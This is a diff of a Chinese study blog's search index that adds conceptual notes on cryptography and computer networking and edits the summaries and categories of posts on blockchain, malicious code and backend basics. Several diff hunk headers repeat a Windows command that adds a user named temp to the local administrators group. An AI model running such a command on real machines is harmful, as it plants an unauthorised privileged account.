-<td></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>区块链介绍</title>
     <url>/2023/08/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>仅作概念介绍、入门食用</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：仅作区块链部分概念介绍，入门食用</p>
 <span id="more"></span>
 
 <h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><blockquote>
@@ -2867,7 +2341,7 @@ net localgroup administrators temp /add
 </ul>
 ]]></content>
       <categories>
-        <category>其他计算机技术</category>
+        <category>区块链</category>
       </categories>
       <tags>
         <tag>密码学</tag>
@@ -2877,7 +2351,7 @@ net localgroup administrators temp /add
   <entry>
     <title>恶意代码</title>
     <url>/2023/09/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A6%82%E8%BF%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对恶意代码做理论介绍，并不涉及具体实例</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：对恶意代码做理论介绍，并不涉及具体实例</p>
 <span id="more"></span>
 
 <h3 id="恶意代码介绍"><a href="#恶意代码介绍" class="headerlink" title="恶意代码介绍"></a>恶意代码介绍</h3><p>恶意代码，为达到恶意目的而专门设计的代码程序，一切旨在破坏网络系统可靠性、可用性、安全性、数据完整性、消耗系统资源皆是</p>
@@ -3217,6 +2691,240 @@ net localgroup administrators temp /add
       <tags>
         <tag>win</tag>
         <tag>恶意代码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>密码学简介</title>
+    <url>/2023/10/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%A6%82%E8%BF%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：对密码学一些概念做阐释，不会涉及具体算法，就是单纯的概念</p>
+<span id="more"></span>
+
+<h3 id="密码学概述"><a href="#密码学概述" class="headerlink" title="密码学概述"></a>密码学概述</h3><ul>
+<li><p>密码学&#x3D;密码编制学（设计密码）+密码分析学（破译密码）</p>
+</li>
+<li><p><strong>基本特性</strong>：机密性（不为人知）；完整性（传输过程防篡改）；可用性（随时可访问）；认证性（确保来源）；不可否认性（不能抵赖）</p>
+</li>
+<li><p><strong>构成</strong>：密码系统由明文空间P、密文空间C、密钥空间K、加E解D密算法构成的集合，即S&#x3D;{P,C,K,E,D}</p>
+</li>
+<li><p><strong>密码分析攻击方式</strong>：</p>
+<ul>
+<li><p>穷举攻击：暴力破解，所有可能尝试</p>
+</li>
+<li><p>数学攻击：现代密码基于数学难题，破解密码就是破解这些难题</p>
+<blockquote>
+<p>以差分分析为主（下面还包括：高阶、截断、不可能差分等）</p>
+</blockquote>
+</li>
+<li><p>物理攻击：从设备下手</p>
+<blockquote>
+<p>侧信道攻击着重于交互过程，包括：功耗分析、时间分析、故障分析</p>
+</blockquote>
+</li>
+</ul>
+<p>依据可利用资源来进行分类：</p>
+<ul>
+<li>仅知密文攻击：顾名思义，香菇无需多言</li>
+<li>已知明文攻击：除密文外，还知道部分明文-密文对</li>
+<li>选择明文攻击：能够直接获取所有明文对应的密文</li>
+<li>选择密文攻击：能够直接获取密文对应的明文</li>
+</ul>
+</li>
+<li><p><strong>密钥交换</strong>：box中放上需要传输的密钥，A加密box传给B，B收到后用自己的加密回送给A，A解密后再发给B，B解密得到密钥（常用于对称加密）</p>
+</li>
+<li><p><strong>密码学分类</strong>：</p>
+<p>按照发展时间：</p>
+<ul>
+<li>古典密码：以字符为基本加密单元</li>
+<li>现代密码：多以信息块为基本加密单元</li>
+</ul>
+<p>依据密码体制分类：</p>
+<ul>
+<li>对称密码体制：加密解密密钥相同</li>
+<li>非对称密码体制：加密解密密钥不同，公钥对外，私钥对内</li>
+</ul>
+<p>明文处理方式分类：</p>
+<ul>
+<li>分组密码：一个密钥对一块数据的加密，输出固定长度</li>
+<li>序列密码&#x2F;流密码：明文与密钥长度一致，基本每一个明文字符对应一个密钥字符</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h3><h4 id="1-电码本模式ECB"><a href="#1-电码本模式ECB" class="headerlink" title="1.电码本模式ECB"></a>1.电码本模式ECB</h4><p>最纯粹的模式，直接使用明文与密钥进行分组加密算法运算。$C_{i}&#x3D;E(M_{i},K);i&#x3D;1,2…n$；缺点在于分组的长度必须是加密算法要求的分组长度整倍数，对于那些多出来的需要以其他方式进行处理。</p>
+<blockquote>
+<p>E()为加密函数，C为密文，K为明文</p>
+</blockquote>
+<p><strong>短块加密</strong>：（适用于所有有短块的工作模式）</p>
+<ol>
+<li>填充法：填充随机数据，将最后的8位作为填充指示符</li>
+<li>序列密码加密法：对短块用序列密码加密$C_{n}&#x3D;M_{n}\oplus MSB_{u}(E(C_{n-1},K))$；其中$MSB_{u}(X)$是取X的高u位；当要加密明文本身即是短块时，选定初始化向量Z代替$C_{n-1}$</li>
+<li>密文挪用技术：在对短块加密之前，先从密文$C_{n-1}$中挪出刚好够填充的位数，将其填充到$M_{n}$中，之后再对$M_{n}$进行加密；当明文本身即为短块时，同样选定初始化向量Z</li>
+</ol>
+<h4 id="2-密文链接模式CBC"><a href="#2-密文链接模式CBC" class="headerlink" title="2.密文链接模式CBC"></a>2.密文链接模式CBC</h4><p><strong>明密文链接模式</strong>：错误传播无界（当有一位发生错误，此后的密文全错）</p>
+<p>$C_{i}&#x3D;\begin{cases}<br>E(M_{i}\oplus Z,K),i&#x3D;1   \<br>E(M_{i}\oplus M_{i-1}\oplus C_{i-1},K),i&#x3D;2…n<br>\end{cases}$</p>
+<p>Z为初始化向量，对应解密：</p>
+<p>$M_{i}&#x3D;\begin{cases}<br>D(C_{i},K),i&#x3D;1   \<br>D(C_{i},K)\oplus M_{i-1}\oplus C_{i-1},i&#x3D;2…n<br>\end{cases}$</p>
+<p><strong>密文链接模式</strong>：错误传播有界（多用于磁盘文件加密）</p>
+<p>$C_{i}&#x3D;\begin{cases}<br>E(M_{i}\oplus Z,K),i&#x3D;1   \<br>E(M_{i}\oplus C_{i-1},K),i&#x3D;2…n<br>\end{cases}$</p>
+<p>解密如下，但是错误传播无界：</p>
+<p>$M_{i}&#x3D;\begin{cases}<br>D(C_{i},K),i&#x3D;1   \<br>D(C_{i},K)\oplus C_{i-1},i&#x3D;2…n<br>\end{cases}$</p>
+<h4 id="3-X-CBC模式"><a href="#3-X-CBC模式" class="headerlink" title="3.X CBC模式"></a>3.X CBC模式</h4><p>不同于前两者，该模式可以处理任意长度的数据明文，但是需要使用三个密钥$K_{1},K_{2},K_{3}$，还以Z作为初始化向量。</p>
+<p>$C_{i}&#x3D;\begin{cases}<br>E(M_{i}\oplus Z,K_{1}),i&#x3D;1   \<br>E(M_{i}\oplus C_{i-1},K_{1}),i&#x3D;2…n-1 \<br>\begin{cases}<br>E(M_{n}\oplus C_{n-1}\oplus K_{2},K_{1}),M_{n}不是短块  \<br>E(Pad(M_{n}\oplus C_{n-1}\oplus K_{3},K_{1})),M_{n}是短块<br>\end{cases}<br>\end{cases}$</p>
+<p>Pad（）为填充函数，如下：</p>
+<p>$Pad(X)&#x3D;\begin{cases}X,当X不是短块\\ X10…0,当X是短块  \end{cases}$</p>
+<h4 id="4-输出反馈模式OFB"><a href="#4-输出反馈模式OFB" class="headerlink" title="4.输出反馈模式OFB"></a>4.输出反馈模式OFB</h4><p>在该模式中，通过密钥序列产生器来产生一个流密钥串，使得分组密码按照流密码的方式进行加解密。具体流程如下：</p>
+<ol>
+<li>R为移位寄存器，赋予初始值（种子）$I_{0}$</li>
+<li>将R中的内容作为明文进行加密，$E(R,K)$</li>
+<li>将得到的加密串最右边的s位与明文进行异或实现序列加密</li>
+<li>后s位再次反馈到R中，即让R中内容左移s位，用于填充，之后再进行下一轮</li>
+</ol>
+<p>适合语音图像等，冗余度加大的数据，但是对于错误传播而难以检测</p>
+<h4 id="5-密文反馈模式CFB"><a href="#5-密文反馈模式CFB" class="headerlink" title="5.密文反馈模式CFB"></a>5.密文反馈模式CFB</h4><p>基本类似于上述方法，区别的是：</p>
+<p>在第四步中反馈给R的后s位，来自加密后的明文的右s位（即第三部结果的右s位）</p>
+<h4 id="6-CTR模式"><a href="#6-CTR模式" class="headerlink" title="6.CTR模式"></a>6.CTR模式</h4><p>与上述两种工作模式一样，将分组密码转换为序列密码，属于对合运算。其中的T是给定的计数序列，且必须是时变的。具体过程如下：$MSB_{u}$代表高u位，u&lt;分组长度</p>
+<p>$\begin{cases}<br>O_{i}&#x3D;E(T_{i},K),i&#x3D;1,2…n   \<br>C_{i}&#x3D;M_{i}\oplus O_{i},i&#x3D;1,2…n-1 \<br>C_{n}&#x3D;M_{n}\oplus MSB_{u}(O_{n})<br>\end{cases}$</p>
+<p>解密过程如下：</p>
+<p>$\begin{cases}<br>O_{i}&#x3D;E(T_{i},K),i&#x3D;1,2…n   \<br>M_{i}&#x3D;C_{i}\oplus O_{i},i&#x3D;1,2…n-1 \<br>M_{n}&#x3D;C_{n}\oplus MSB_{u}(O_{n})<br>\end{cases}$</p>
+<p>由于没有错误传播，所以不适合用于数据完整性认证</p>
+<hr>
+<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>三个基本条件：</p>
+<ul>
+<li>签名者事后不能抵赖自己的签名</li>
+<li>任何其他人并不能伪造签名</li>
+<li>签名能够被验证真伪</li>
+</ul>
+<p>签名产生算法$SIG$，签名验证算法$VER$，产生签名应当用私密钥$K_{d}$，公开验证时用公密钥$K_{e}$。</p>
+<p>函数必须满足的条件：</p>
+<ul>
+<li>当$M’\ne M$时，有$SIG(M,K_{d})\ne SIG(M’,K_{d})$，即$S\ne S’$</li>
+<li>签名$S$只能由签名者产生，否则别人可以伪造，就会存在抵赖</li>
+<li>收信者可以验证真伪</li>
+<li>签名纠纷发生时，应当能够公开解决（私密钥不能泄露）</li>
+</ul>
+<p>可选成立：</p>
+<ul>
+<li>$VER(S,K_{e})&#x3D;VER(SIG(M,K_{d}),K_{e})&#x3D;M$</li>
+<li>$VER(SIG(M,K_{d}),K_{e})&#x3D;SIG(VER(M,K_{e}),K_{d})&#x3D;M$</li>
+</ul>
+<p>即验证算法时使用的公密钥对密文处理时，不一定非要是明文，只要能够得到$K_{d}$和$K_{e}$之间的关系即可</p>
+<hr>
+<h3 id="密码协议"><a href="#密码协议" class="headerlink" title="密码协议"></a>密码协议</h3><p>大致按照功能分类如下：</p>
+<ul>
+<li>密钥建立协议：用于确定会话密钥</li>
+<li>认证协议：包括不限于身份认证协议、通信站点认证协议、报文认证协议</li>
+<li>身份验证和密钥建立协议：前两者的结合，先验证在确定密钥</li>
+<li>电子商务协议：还注重公平性</li>
+</ul>
+<p>设计原则：</p>
+<ul>
+<li>消息独立完整性原则：无二义性，且无需借助上下文</li>
+<li>消息前提准确原则：消息相关的先决条件需要确立</li>
+<li>主体身份标识原则：消息中或隐或显的附在消息中，如果需要的话</li>
+<li>加密目的原则：明确加密的目的，减少冗余</li>
+<li>签名原则：如果需要同时签名和加密，应先签名（对数据Hash签）再加密</li>
+<li>随机数使用原则：随机性应符合要求</li>
+<li>时间戳的使用原则：不同系统的时钟同步</li>
+<li>编码原则：需要明确协议中消息的具体数据格式</li>
+<li>最少安全假设原则：验证协议时需要尽可能减少安全假设，假设越多证明实际越危险</li>
+</ul>
+<p>协议安全分析：形式逻辑分析、模型检测方法、定理证明方法</p>
+<hr>
+<h3 id="认证-鉴别"><a href="#认证-鉴别" class="headerlink" title="认证&#x2F;鉴别"></a>认证&#x2F;鉴别</h3><p>与数字签名不同，认证是在双方诚实的前提下，提供的一种验证信心来源真假的手段；具体区别如下：</p>
+<ul>
+<li>认证基于双方共享的保密数据，数字签名的签名验证属于公开信息</li>
+<li>认证仅允许双方验证，数字签名还可以有第三方</li>
+<li>数字签名发送方不能抵赖、接收方不能伪造，能在公众面前解决纠纷的能力，认证不行</li>
+</ul>
+<p><strong>身份认证</strong>：</p>
+<ul>
+<li><p>口令：传统的用户输入密码，系统查表对照</p>
+<p>传统方案缺点：口令表直接获取、传输线路截取、用户无法验证系统</p>
+<p>改进措施：单向函数加密、数字签名验证口令、口令双向验证、一次性口令</p>
+<p>Good口令：多种字符、足够长、尽量随机、定期更换</p>
+</li>
+<li><p>磁卡（仅数据存储）、IC卡（嵌有单片机芯片）、USB-Key（有USB接口的单片机）</p>
+<blockquote>
+<p>PIN个人识别号，必须牢记，用来防治上述物品丢失直接导致信息泄露</p>
+</blockquote>
+</li>
+<li><p>生理特征识别：DNA、掌纹、指纹、面孔、虹膜、骨架、发音</p>
+</li>
+<li><p>零知识证明：最简单的A向B说出只有A知道的特征，进一步就是让B知道“A知道“该特征而不用泄露</p>
+<blockquote>
+<p>Feige-Giat-Shamir身份认证方案、Guillou-Quisquater方案</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>站点认证</strong>：</p>
+<p>单向认证：A发送方，B接收方，若共享一个会话密钥$K_{s}$</p>
+<ol>
+<li>A先产生随机数$R_{A}$，用密钥加密后发给B，并进行$f(R_{A})$</li>
+<li>B用会话密钥对报文解密，得到$R_{A}$之后再用f变换，$f(R_{A})$使用密钥加密发给A</li>
+<li>A对$f(R_{A})$进行验证</li>
+</ol>
+<p>若使用公钥密码体制：双方公私钥为$K_{eA}K_{dA}&amp; K_{eB}K_{dB}$</p>
+<ol>
+<li>A产生随机数$R_{A}$发给B</li>
+<li>B用私钥签名发给A，A再拿B的公钥验证</li>
+</ol>
+<p>双向认证：符号如上不再多说，下面是传统密码</p>
+<ol>
+<li>A产生随机数$R_{A}$，用$K_{s}$加密后发给B</li>
+<li>B用$K_{s}$解密后得到$R_{A}$，自己也产生随机数$R_{B}$并与$R_{A}$拼接，再用$K_{s}$加密后发送</li>
+<li>A解密后对比$R_{A}$，确定B为目标，并将$R_{B}$加密后发给B，来让B确认A</li>
+</ol>
+<p>公钥密码体制：</p>
+<ol>
+<li>A产生随机数$R_{A}$直接给B</li>
+<li>B自己产生随机数$R_{B}$，拼在$R_{A}$后面，并用$K_{dB}$签名后给A</li>
+<li>A用$K_{eB}$验证签名，将得到的$R_{A}$对比，确定B为目标后，再用$K_{dA}$对$R_{B}$签名发送</li>
+<li>B用A的公钥$K_{eA}$进行验证</li>
+</ol>
+<p><strong>报文认证</strong>：</p>
+<ul>
+<li><p>报文源认证：对于传统密码$A\to B:E(ID_{A}||M,K_{s})$，$ID_{A}$代表A的标识</p>
+<p>公开密钥密码$A\to B:D(ID_{A}||M,K_{dA})$</p>
+</li>
+<li><p>报文宿认证：传统密码$A\to B:E(ID_{B}||M,K_{s})$</p>
+<p>公开密钥密码$A\to B:E(ID_{B}||M,K_{eB})$</p>
+</li>
+<li><p>报文内容的认证：通过验证MAC（消息认证码）的正确性来实现；$MAC&#x3D;C(M,K)$，K为共享密钥（前提），输出固定长度的短数据块。目前C函数多基于Hash函数或分组密码实现</p>
+<p>A向B发送报文M和对应的MAC，B收到后同样用K计算M的MAC值，相等则确保：报文没被修改、报文发送方确定正确</p>
+</li>
+<li><p>报文时间性认证：序列号、时间戳、随机数</p>
+</li>
+</ul>
+<hr>
+<h3 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h3><ul>
+<li>管理策略着重指导，机制侧重具体实现</li>
+<li>全程安全原则：密钥的产生、存储、分配、组织、使用、停用、更换、销毁过程必须确保妥善的安全管理</li>
+<li>最小权力原则：应当只分配给用户进行某一项事务处理的最小密钥集合</li>
+<li>责任分离原则：一个密钥一种功能，切忌多个账号一个密码！</li>
+<li>密钥分级原则：分为高低级密钥进行管理</li>
+<li>密钥更换原则、必须满足满足安全性指标</li>
+</ul>
+<p>KMC——密钥管理中心；KDC——密钥分配中心；PKI——公开密钥基础设施；CA——证书签发机构；RA——等级证书机构；PKDB——公钥库；PKC——公钥证书</p>
+<p><strong>密钥的组织</strong>：</p>
+<ul>
+<li>初级密钥：初级通信密钥$K_{c}$、会话密钥$K_{s}$、初级文件密钥$K_{f}$</li>
+<li>中级密钥：保护初级，中级通信密钥$K_{NC}$、中级文件密钥$K_{NF}$</li>
+<li>高级密钥（主密钥）：对下两级进行保护$K_{M}$，生存周期最长</li>
+</ul>
+<p><strong>密钥产生</strong>：</p>
+<ul>
+<li>高级：高质量<strong>真随机</strong>序列；常采用物理噪声源的方法（基于力学、电子学、量子学的噪声源）</li>
+<li>中级：可借用高级密钥和一个强的密码算法产生，纯随机最好</li>
+<li>低级：高级密钥或中级密钥加密过的数</li>
+</ul>
+<blockquote>
+<p>伪随机数产生：基于强密码算法、ANSI X9.17伪随机数产生算法、BBS伪随机数生成器</p>
+</blockquote>
+<p>存储形态：明文、密文、分量</p>
+<p>备份：不同设备、不同地点、日志记录并审计、应当方便恢复、备份密钥一视同仁</p>
+]]></content>
+      <tags>
+        <tag>密码</tag>
       </tags>
   </entry>
   <entry>
@@ -4996,7 +4704,7 @@ d15=100011110101100
   <entry>
     <title>后端基础知识</title>
     <url>/2023/09/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对服务器做一个大概了解，同时也会对数据库做一些理论知识说明。</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：对服务器做一个大概了解，同时也会对数据库做一些理论知识说明。</p>
 <span id="more"></span>
 
 <h3 id="0x01-什么是服务器"><a href="#0x01-什么是服务器" class="headerlink" title="0x01.什么是服务器"></a>0x01.什么是服务器</h3><h4 id="服务器介绍"><a href="#服务器介绍" class="headerlink" title="服务器介绍"></a>服务器介绍</h4><p>与平时的计算机类似，但是相对比较专业化，具有更强大的计算处理能力，其硬件也相对更好；目前市面术语介绍：</p>
@@ -5253,9 +4961,502 @@ d15=100011110101100
       </tags>
   </entry>
   <entry>
+    <title>计网第一章_概述</title>
+    <url>/2023/10/06/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0_%E6%A6%82%E8%BF%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：以《计算机网络》谢希仁第八版为参考，会从下向上讲述，如有重复的将不再赘述</p>
+<span id="more"></span>
+
+<h3 id="计网发展阶段"><a href="#计网发展阶段" class="headerlink" title="计网发展阶段"></a>计网发展阶段</h3><ol>
+<li><p>面向终端的计算机网络</p>
+<p>特点：系统中仅主计算机有计算能力，终端无独立处理数据的能力。</p>
+<blockquote>
+<p>线路控制器：串并转换+传输差错控制；调制&#x2F;解调器：用于数字和模拟信号的转换</p>
+</blockquote>
+<p>为降低通信成本：主机前增设前端处理机，终端密集地放置集中器，用以解决终端独占线路与助记负载过重的问题</p>
+</li>
+<li><p>计算机通信网络or分组交换网络or面向标准的计算机网络</p>
+<p>特点：可用于数据传输、终端类型广、节点同等重要、冗余路由、简单但又相对可靠</p>
+<p>先后提出<strong>存储转发技术</strong>与<strong>分组交换技术</strong>（后者相对于前者每一次转发的不是整个文件而是切割后的小包）</p>
+</li>
+<li><p>共享资源的计算机网络</p>
+<p>特点：共享数据为主、每个网络内部使用各自的协议、网络之间用TCP&#x2F;IP协议簇</p>
+<p>三个阶段：</p>
+<ol>
+<li>由单个网络ARPANET发展而来，1983年以TCP&#x2F;IP协议簇为标准也因此作为互联网诞生时间，1990年关闭</li>
+<li>三级结构互联网，包括主干网—地区网—校园网&#x2F;企业网三级</li>
+<li>多层次ISP（互联网服务提供者）结构的互联网，由Alice-本地ISP-地区ISP-主干ISP-…-本地ISP-Bob</li>
+</ol>
+</li>
+<li><p>Internet高速发展</p>
+<ul>
+<li><p>SDN软件定义网络</p>
+</li>
+<li><p>云计算：分布式、并行计算、虚拟化</p>
+</li>
+<li><p>物联网IoT，借助云实现普适计算</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="计算机网络概念"><a href="#计算机网络概念" class="headerlink" title="计算机网络概念"></a>计算机网络概念</h3><p>最简定义：计算机网络是一些互相连接的、自治的计算机系统的集合。其中最大的计算机网络就是Internet——也叫做网络的网络（Network of Network）</p>
+<h3 id="计算机网络组成"><a href="#计算机网络组成" class="headerlink" title="计算机网络组成"></a>计算机网络组成</h3><p><strong>物理组成</strong>：</p>
+<ul>
+<li><p>硬件：主机host、通信处理控制机CCP、路由器Router、交换机Switch、通信链路。</p>
+<blockquote>
+<p>物理媒介&#x2F;物理链路：双绞铜线、同轴电缆、光纤、陆地无线通信、卫星无线通信</p>
+</blockquote>
+</li>
+<li><p>软件：共享的资源的软件、工具软件</p>
+</li>
+<li><p>协议：通信协议、数据交换协议</p>
+</li>
+</ul>
+<p><strong>要素组成</strong>：计算机、路由器、交换机、网卡、通信线路、调制解调器</p>
+<p><strong>功能组成</strong>：资源子网（数据的处理存储）、通信子网（数据的传输）</p>
+<h3 id="互联网组成"><a href="#互联网组成" class="headerlink" title="互联网组成"></a>互联网组成</h3><ul>
+<li><p>直接连接的：点到点链路、经集线器HUB（盒装总线）、多路访问链路</p>
+</li>
+<li><p>网络云：端系统经交换网互联；网络云互联构成互联网，必定有路由器</p>
+<blockquote>
+<p>核心部分&#x3D;网路+路由器（关键！网网互联）；<br>边缘部分&#x3D;主机+终端；端系统之间的通讯方式：C&#x2F;S方式、P2P方式</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h3><ul>
+<li><p>电路交换：$N$部电话机需要$N(N-1)&#x2F;2$对电线，当然也可以使用交换机。</p>
+<p>必定是面向连接的、线路利用率低</p>
+<p>包括三个阶段：建立专用连接——双方通信——释放连接</p>
+</li>
+</ul>
+<ul>
+<li><p>报文交换：在分组交换之前，基于存储转发，不分组而已。</p>
+</li>
+<li><p>分组交换：同样基于存储转发技术，但是长切短分组进行。</p>
+<ul>
+<li>分组&#x3D;首部+数据，首部含有源&#x2F;目的地址，节点交换机据此转发报文；有额外开销</li>
+<li>每个分组独立选择路径</li>
+<li>路由器处理：放入缓存——查找转发表——送走；需要排队有时延</li>
+</ul>
+</li>
+</ul>
+<h3 id="计算机网络分类"><a href="#计算机网络分类" class="headerlink" title="计算机网络分类"></a>计算机网络分类</h3><ul>
+<li><p>分布范围：广域网WAN（交换技术）、城域网MAN、局域网LAN（广播技术）、个人区域网PAN</p>
+</li>
+<li><p>使用者：公用网、私用网或是骨干网、接入网、驻地网</p>
+</li>
+<li><p>拓扑结构：总线型、星型、环型、树型、网格型</p>
+</li>
+<li><p>数据交换技术：电路交换、报文交换、分组交换、信元交换、广播技术网络</p>
+<blockquote>
+<p>信元交换，又叫异步传输模式（ATM），一种使用异步时分复用技术的面向分组的传输方式，它将信息流分割成53字节的ATM信元&#x3D;5B信头+48净荷</p>
+</blockquote>
+</li>
+<li><p>按协议：IP网络、IPX网络（非IP网络）</p>
+</li>
+<li><p>传输介质：有线、无线</p>
+</li>
+<li><p>共享资源：C&#x2F;S、P2P</p>
+</li>
+</ul>
+<h3 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h3><p><strong>网络协议</strong>：为进行网络中数据交换而事先约定好的规则。它定义了在两个或多个通信实体之间交换的报文格式和次序，以及在报文传输和接受其他事件方面所采取的动作。只确定外部特点内部具体实现不做规定</p>
+<ul>
+<li><p>构成：语法（结构格式）、语义（操作定义）、同步（事件实现顺序）</p>
+</li>
+<li><p>再同一协议下，两个对等实体之间的通信又可以叫做虚拟通信&#x2F;逻辑通信（没有直接联系），其基于下层所提供的服务实现</p>
+</li>
+<li><p>协议是水平的，服务是垂直的；</p>
+</li>
+<li><p>不同系统中对等实体间交换数据的单位叫第N层的<strong>协议数据单元（N）PDU</strong>。包含用户数据（也可以是SDU）&amp;该层的<strong>协议控制信息PCI</strong>；</p>
+<p>同一系统相邻两层实体间经过接口交换的数据单位叫<strong>接口数据单元IDU</strong>，包括PDU和<strong>接口控制信息ICI</strong></p>
+<p><img src="https://img1.imgtp.com/2023/10/06/K8feAjLX.png" alt="image-20231006203523562"></p>
+</li>
+</ul>
+<p><strong>网络体系结构</strong>：计算机网络各层及其协议的集合</p>
+<ul>
+<li><p>分层体系结构：目标机第n层接收源主机第n层数据</p>
+</li>
+<li><p>服务：每一层，向上提供服务，以下层的服务为基础而无需考虑</p>
+</li>
+<li><p>实体：发送接收信息的任何对象，可以是终端、进程等。</p>
+<p>不同系统同一层的双方叫对等实体；一般叫下层实体为服务提供者，上层为服务用户</p>
+</li>
+<li><p>接口：<strong>服务访问点SAP</strong>，即第N层实体与第N+1层实体交换数据的地方&#x3D;N层SAP，地址唯一，期间交换信息单位叫<strong>服务数据单元SDU</strong></p>
+</li>
+</ul>
+<p><strong>典型体系结构</strong>：</p>
+<ul>
+<li><p>OSI七层：7应用层，6表示层（翻译应用层），5会话层（管理上层），4传输层，3网络层，2数据链路层，1物理层</p>
+<blockquote>
+<p>数据单元从上到下：APDU、PPDU、SPDU、TPDU、分组、帧、比特流；路由器最高下三层，交换机低两层</p>
+</blockquote>
+</li>
+<li><p>TCP&#x2F;IP四层：应用层—运输层—网际层IP—网络接口层</p>
+</li>
+<li><p>经典五层：5应用层，4运输层，3网络层（包，报），2数据链路层（网卡、网桥，帧），1物理层（线，比特）</p>
+</li>
+</ul>
+<p><strong>各层主要功能</strong>：</p>
+<ul>
+<li>差错控制、流量控制、分段和重装</li>
+<li>复用和分用：发送端几个高层会话复用一条低层的连接，在接收端进行分用</li>
+<li>连接建立和释放：交换前先建立逻辑连接，结束后再释放该连接</li>
+</ul>
+<h3 id="计算机网络的性能"><a href="#计算机网络的性能" class="headerlink" title="计算机网络的性能"></a>计算机网络的性能</h3><ul>
+<li><p>速率：数据传输速率，又叫数据率或比特率，常用bit&#x2F;s、kbit&#x2F;s等，按照1k&#x3D;1000计算</p>
+</li>
+<li><p>带宽：单位时间内能通过的最大数据量，单位bit&#x2F;s，即最大速率</p>
+</li>
+<li><p>吞吐率：单位与前面相同，带宽是最大的速率，吞吐率是实际</p>
+</li>
+<li><p>时延：总时延&#x3D;以下四者的和（注意！高速链路指的是提高发送速率，传播速率由介质决定）</p>
+<ul>
+<li>发送时延：$\frac{数据帧长度bit}{发送速率bit&#x2F;s}$，数据帧从发送端到传输媒介的时间</li>
+<li>传播时延：$\frac{信道长m}{信道传播速率m&#x2F;s}$，信号在传输媒介中跑的时间</li>
+<li>处理时延：主机或处理器处理分组所花费的时间</li>
+<li>排队时延：在路由器的输入输出队列中排队等待处理的时间</li>
+</ul>
+</li>
+<li><p>时延带宽积：又叫做“以比特为单位的链路长度”，&#x3D;传播时延×带宽</p>
+</li>
+<li><p>往返时间RTT：”发送方”发送数据开始到接收到”接收方”的确认</p>
+</li>
+<li><p>利用率：包括信道利用率（某信道有多少时间被用），网络利用率（全网络的信道利用率的加权平均值）</p>
+<blockquote>
+<p>$D&#x3D;\frac{D_{0} }{1-U}$：$D_{0}$网络空闲时的时延，$D$表示当前时延，$U$为网络利用率</p>
+</blockquote>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>计算机网络</category>
+      </categories>
+      <tags>
+        <tag>基础知识</tag>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络技术</title>
+    <url>/2023/09/10/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：介绍一些网络上的重要技术与设备，如CDN、VPN、P2P、IDS等</p>
+<span id="more"></span>
+
